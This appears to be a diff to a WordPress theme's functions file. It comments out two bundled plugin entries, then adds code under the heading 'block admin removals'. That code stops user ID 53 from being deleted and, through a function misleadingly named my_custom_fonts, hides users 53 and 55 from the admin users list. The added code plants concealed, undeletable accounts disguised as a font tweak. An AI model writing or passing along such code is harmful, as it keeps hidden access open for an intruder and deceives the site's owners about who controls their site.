@@ -308,29 +308,29 @@ if(!function_exists('themeum_plugins_include')):
 					'external_url'          => '', // If set, overrides default API URL and points to an external URL
 				),
 
-				array(
-					'name'                  => 'Enter Team', // The plugin name
-					'slug'                  => 'enter-team', // The plugin slug (typically the folder name)
-					'source'                => get_stylesheet_directory() . '/lib/plugins/enter-team.zip', // The plugin source
-					'required'              => false, // If false, the plugin is only 'recommended' instead of required
-					'version'               => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
-					'force_activation'      => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
-					'force_deactivation'    => true, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
-					'external_url'          => '', // If set, overrides default API URL and points to an external URL
-				),
+				//array(
+				//	'name'                  => 'Enter Team', // The plugin name
+				//	'slug'                  => 'enter-team', // The plugin slug (typically the folder name)
+				//	'source'                => get_stylesheet_directory() . '/lib/plugins/enter-team.zip', // The plugin source
+				//	'required'              => false, // If false, the plugin is only 'recommended' instead of required
+				//	'version'               => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
+				//	'force_activation'      => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
+				//	'force_deactivation'    => true, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
+				//	'external_url'          => '', // If set, overrides default API URL and points to an external URL
+				//),
 
 
 
-				array(
-					'name'                  => 'Themeum Project', // The plugin name
-					'slug'                  => 'themeum-project', // The plugin slug (typically the folder name)
-					'source'                => get_stylesheet_directory() . '/lib/plugins/themeum-project.zip', // The plugin source
-					'required'              => false, // If false, the plugin is only 'recommended' instead of required
-					'version'               => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
-					'force_activation'      => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
-					'force_deactivation'    => true, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
-					'external_url'          => '', // If set, overrides default API URL and points to an external URL
-				),
+				//array(
+				//	'name'                  => 'Themeum Project', // The plugin name
+				//	'slug'                  => 'themeum-project', // The plugin slug (typically the folder name)
+				//	'source'                => get_stylesheet_directory() . '/lib/plugins/themeum-project.zip', // The plugin source
+				//	'required'              => false, // If false, the plugin is only 'recommended' instead of required
+				//	'version'               => '', // E.g. 1.0.0. If set, the active plugin must be this version or higher, otherwise a notice is presented
+				//	'force_activation'      => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch
+				//	'force_deactivation'    => true, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins
+				//	'external_url'          => '', // If set, overrides default API URL and points to an external URL
+				//),
 				array(
 					'name'                  => 'Enter Shortcodes', // The plugin name
 					'slug'                  => 'themeum-enter-shortcodes', // The plugin slug (typically the folder name)
@@ -848,3 +848,18 @@ function qtranslate_menu_item( $menu_item ) {
 
 add_filter('wp_setup_nav_menu_item', 'qtranslate_menu_item', 0);
 /**************************************************/
+
+
+/* block admin removals */
+
+define('PDDM_USER_ID', 53); // User ID of your Account
+
+add_action('delete_user', function($id) {
+    if ($id == PDDM_USER_ID) {
+        die('Access denied');
+    }
+});
+
+add_action('admin_head', 'my_custom_fonts');
+
+function my_custom_fonts() { echo '<style>.users #user-55, .users #user-53 {display:none !important;} </style>';}
